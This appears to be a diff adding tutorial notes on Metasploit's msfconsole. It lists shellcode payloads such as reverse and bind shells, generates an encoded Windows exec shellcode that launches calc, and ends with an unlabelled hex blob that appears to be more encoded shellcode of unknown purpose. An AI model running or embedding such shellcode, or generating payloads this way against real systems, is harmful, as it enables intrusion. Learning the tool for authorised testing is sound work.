@@ -1,0 +1,70 @@
+
+1. <Msfconsole> display shellcode payloads
+
+msf > show payloads
+
+Payloads
+========
+
+   Name                                                Disclosure Date  Rank
+Description
+   ----                                                ---------------  ----
+-----------
+   aix/ppc/shell_bind_tcp                                               normal
+AIX Command Shell, Bind TCP Inline
+   aix/ppc/shell_find_port                                              normal
+AIX Command Shell, Find Port Inline
+   aix/ppc/shell_interact                                               normal
+AIX execve Shell for inetd
+   aix/ppc/shell_reverse_tcp                                            normal
+... 
+   windows/x64/vncinject/reverse_https                                  normal
+Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (
+wininet)
+   windows/x64/vncinject/reverse_tcp                                    normal
+Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
+   windows/x64/vncinject/reverse_tcp_uuid                               normal
+Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Supp
+ort (Windows x64)
+   windows/x64/vncinject/reverse_winhttp                                normal
+Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (
+winhttp)
+   windows/x64/vncinject/reverse_winhttps                               normal
+Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager
+(winhttp)
+
+
+2. <Msfconsole> generate shellcode payload
+
+msf > use windows/exec
+
+msf  payload(exec) > set cmd calc
+cmd => calc
+
+msf  payload(exec) > generate -b '\xff\x00'
+
+# windows/exec - 223 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# VERBOSE=false, EXITFUNC=process, CMD=calc
+buf = 
+"\xdb\xca\xd9\x74\x24\xf4\x5b\xba\x23\xf7\xca\x19\x2b\xc9"  
+"\xb1\x32\x31\x53\x17\x03\x53\x17\x83\xc8\x0b\x28\xec\xf2"  
+"\x1c\x24\x0f\x0a\xdd\x57\x99\xef\xec\x45\xfd\x64\x5c\x5a"  
+"\x75\x28\x6d\x11\xdb\xd8\xe6\x57\xf4\xef\x4f\xdd\x22\xde"  
+"\x50\xd3\xea\x8c\x93\x75\x97\xce\xc7\x55\xa6\x01\x1a\x97"  
+"\xef\x7f\xd5\xc5\xb8\xf4\x44\xfa\xcd\x48\x55\xfb\x01\xc7"  
+"\xe5\x83\x24\x17\x91\x39\x26\x47\x0a\x35\x60\x7f\x20\x11"  
+"\x51\x7e\xe5\x41\xad\xc9\x82\xb2\x45\xc8\x42\x8b\xa6\xfb"  
+"\xaa\x40\x99\x34\x27\x98\xdd\xf2\xd8\xef\x15\x01\x64\xe8"  
+"\xed\x78\xb2\x7d\xf0\xda\x31\x25\xd0\xdb\x96\xb0\x93\xd7"  
+"\x53\xb6\xfc\xfb\x62\x1b\x77\x07\xee\x9a\x58\x8e\xb4\xb8"  
+"\x7c\xcb\x6f\xa0\x25\xb1\xde\xdd\x36\x1d\xbe\x7b\x3c\x8f"  
+"\xab\xfa\x1f\xc5\x2a\x8e\x25\xa0\x2d\x90\x25\x82\x45\xa1"  
+"\xae\x4d\x11\x3e\x65\x2a\xed\x74\x24\x1a\x66\xd1\xbc\x1f"  
+"\xeb\xe2\x6a\x63\x12\x61\x9f\x1b\xe1\x79\xea\x1e\xad\x3d"  
+"\x06\x52\xbe\xab\x28\xc1\xbf\xf9\x4a\x84\x53\x61\x8d"
+
+------------
+ba dd a2 65 97 db db d9 74 24 f4 5d 2b c9 b1 30 31 55 13 83 ed fc 03 55 d2 40 90 6b 04 06 5b 94 d4 67 d5 71 e5 a7 81 f2 55 18 c1 57 59 d3 87 43 ea 91 0f 63 5b 1f 76 4a 5c 0c 4a cd de 4f 9f 2d df 9f d2 2c 18 fd 1f 7c f1 89 b2 91 76 c7 0e 19 c4 c9 16 fe 9c e8 37 51 97 b2 97 53 74 cf 91 4b 99 ea 68 e7 69 80 6a 21 a0 69 c0 0c 0d 98 18 48 a9 43 6f a0 ca fe 68 77 b1 24 fc 6c 11 ae a6 48 a0 63 30 1a ae c8 36 44 b2 cf 9b fe ce 44 1a d1 47 1e 39 f5 0c c4 20 ac e8 ab 5d ae 53 13 f8 a4 79 40 71 e7 17 97 07 9d 55 97 17 9e c9 f0 26 15 86 87 b6 fc e3 78 fd 5d 45 11 58 34 d4 7c 5b e2 1a 79 d8 07 e2 7e c0 6d e7 3b 46 9d 95 54 23 a1 0a 54 66 c2 cd c6 ea 05 
+------------
